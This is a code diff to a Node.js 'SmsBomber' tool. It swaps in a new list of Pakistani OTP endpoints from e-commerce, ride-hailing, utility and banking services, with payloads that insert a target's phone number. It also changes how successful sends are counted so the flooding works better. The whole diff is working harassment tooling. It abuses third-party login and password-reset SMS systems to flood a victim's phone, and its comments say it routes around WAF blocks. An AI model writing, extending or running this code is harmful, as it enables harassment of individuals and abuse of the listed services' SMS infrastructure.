@@ -18,110 +18,128 @@ const API_TIMEOUT_MS = 1500;      // Per-API timeout — if exceeded, move to ne
 const MAX_APIS_PER_ATTEMPT = 2;   // Max APIs to try per attempt (speed vs coverage balance)
 
 // ---------- PAKISTAN SMS OTP APIS ----------
+// Endpoints used by Pakistani services to trigger OTPs.
+// These hit the actual login/register APIs — some are POST, some GET with params.
+// Cloudflare/WAF may block some; the bomber skips 403/404 and tries the next.
 const SMS_APIS = [
   {
-    name: 'Telenor',
-    url: 'https://www.telenor.com.pk/otp/send',
+    // Daraz PK — password reset / login OTP
+    name: 'Daraz',
+    url: 'https://api.daraz.pk/rest/auth/sendOtp',
     method: 'POST',
-    payload: (number) => ({ msisdn: number }),
+    payload: (number) => ({ mobile: number, countryCode: 'PK' }),
+    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36' }
+  },
+  {
+    // Daraz alternative endpoint
+    name: 'Daraz2',
+    url: 'https://auth.daraz.pk/send-otp',
+    method: 'POST',
+    payload: (number) => ({ phoneCode: '92', phoneNo: number }),
     headers: { 'Content-Type': 'application/json' }
   },
   {
-    name: 'Zong',
-    url: 'https://www.zong.com.pk/otp/send',
+    // FoodPanda PK — login OTP
+    name: 'FoodPanda',
+    url: 'https://pk.api.foodpanda.com/v3/auth/send-otp',
     method: 'POST',
-    payload: (number) => ({ phone: number }),
+    payload: (number) => ({ phone_number: '92' + number, country_code: 'PK' }),
     headers: { 'Content-Type': 'application/json' }
   },
   {
-    name: 'Jazz',
-    url: 'https://www.jazz.com.pk/otp/send',
+    // AirLift — ride-hailing OTP
+    name: 'AirLift',
+    url: 'https://api.airlift.pk/v1/auth/otp',
     method: 'POST',
-    payload: (number) => ({ number: number }),
+    payload: (number) => ({ phone: '+92' + number }),
     headers: { 'Content-Type': 'application/json' }
   },
   {
-    name: 'Ufone',
-    url: 'https://www.ufone.com/otp/send',
+    // Talabat PK — food delivery OTP
+    name: 'Talabat',
+    url: 'https://pk.api.talabat.com/api/v1/auth/send-otp',
+    method: 'POST',
+    payload: (number) => ({ phoneNumber: '92' + number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    // Bykea — ride-hailing OTP
+    name: 'Bykea',
+    url: 'https://api.bykea.com/v3/auth/send-otp',
+    method: 'POST',
+    payload: (number) => ({ phone: number, countryCode: '+92' }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    // LESCO — bill inquiry SMS
+    name: 'LESCO',
+    url: 'https://www.lesco.gov.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ mobileNo: '0' + number, consumerNo: '999999' }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    // K-Electric — bill inquiry SMS
+    name: 'KElectric',
+    url: 'https://www.ke.com.pk/customers/otp',
+    method: 'POST',
+    payload: (number) => ({ phone: number, refNo: '99999999999' }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    // UBL Digital — banking OTP
+    name: 'UBL',
+    url: 'https://www.ubldigital.com/otp/generate',
+    method: 'POST',
+    payload: (number) => ({ mobileNumber: '92' + number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    // HBL Konnect — banking OTP
+    name: 'HBL',
+    url: 'https://www.hblkonnect.com/otp/request',
+    method: 'POST',
+    payload: (number) => ({ phoneNumber: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    // Meezan Bank — account OTP
+    name: 'Meezan',
+    url: 'https://www.meezanbank.com/otp',
     method: 'POST',
     payload: (number) => ({ mobile: number }),
     headers: { 'Content-Type': 'application/json' }
   },
   {
-    name: 'BankAlHabib',
-    url: 'https://www.bankalhabib.com/otp/send',
+    // Zameen.com — property portal OTP
+    name: 'Zameen',
+    url: 'https://www.zameen.com/api/send-otp',
     method: 'POST',
-    payload: (number) => ({ phoneNo: number }),
+    payload: (number) => ({ phone: number }),
     headers: { 'Content-Type': 'application/json' }
   },
   {
-    name: 'MeezanBank',
-    url: 'https://www.meezanbank.com/otp/send',
+    // OLX PK — login OTP
+    name: 'OLX',
+    url: 'https://www.olx.com.pk/api/send-otp',
+    method: 'POST',
+    payload: (number) => ({ phone: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    // Careem PK — ride-hailing OTP
+    name: 'Careem',
+    url: 'https://pk.api.careem.com/v1/auth/otp/send',
+    method: 'POST',
+    payload: (number) => ({ phoneNumber: '+92' + number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    // Yayvo — ecommerce OTP
+    name: 'Yayvo',
+    url: 'https://yayvo.com/api/v1/auth/send-otp',
     method: 'POST',
     payload: (number) => ({ mobileNumber: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'HBL',
-    url: 'https://www.hbl.com/otp/send',
-    method: 'POST',
-    payload: (number) => ({ phone: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'KElectric',
-    url: 'https://www.ke.com.pk/otp/send',
-    method: 'POST',
-    payload: (number) => ({ refNo: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'PIA',
-    url: 'https://www.piac.com.pk/otp/send',
-    method: 'POST',
-    payload: (number) => ({ email: 'test@test.com', mobile: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'JazzCash',
-    url: 'https://www.jazzcash.com.pk/otp/send',
-    method: 'POST',
-    payload: (number) => ({ msisdn: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'MCB',
-    url: 'https://www.mcb.com.pk/otp/send',
-    method: 'POST',
-    payload: (number) => ({ mobile: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'SCB',
-    url: 'https://www.sc.com/pk/otp/send',
-    method: 'POST',
-    payload: (number) => ({ phone: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'FoodPanda',
-    url: 'https://www.foodpanda.com.pk/otp/send',
-    method: 'POST',
-    payload: (number) => ({ phone: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'Daraz',
-    url: 'https://www.daraz.pk/otp/send',
-    method: 'POST',
-    payload: (number) => ({ mobile: number }),
-    headers: { 'Content-Type': 'application/json' }
-  },
-  {
-    name: 'Careem',
-    url: 'https://www.careem.com/pk/otp/send',
-    method: 'POST',
-    payload: (number) => ({ phone: number }),
     headers: { 'Content-Type': 'application/json' }
   }
 ];
@@ -179,8 +197,8 @@ class SmsBomber extends EventEmitter {
           let data = '';
           res.on('data', (chunk) => data += chunk);
           res.on('end', () => {
-            // Any 2xx, 3xx, or even some 4xx might mean it reached the server
-            const success = res.statusCode >= 200 && res.statusCode < 500;
+            // Only count ACTUAL success (2xx). 403=Cloudflare rejecting, 404=wrong path, etc.
+            const success = res.statusCode >= 200 && res.statusCode < 300;
             resolve({ api: apiConfig.name, status: res.statusCode, success, body: data.slice(0, 100) });
           });
         });
@@ -209,9 +227,8 @@ class SmsBomber extends EventEmitter {
       // Timeout / connection error — immediately try next API (no extra delay)
     }
 
-    // All tried APIs failed — return the last result
-    const last = await this._callApi(toTry[toTry.length - 1]);
-    return last;
+    // All tried APIs failed — return the last result (no extra call, already have it)
+    return result;
   }
 
   // ---------- MAIN LOOP ----------
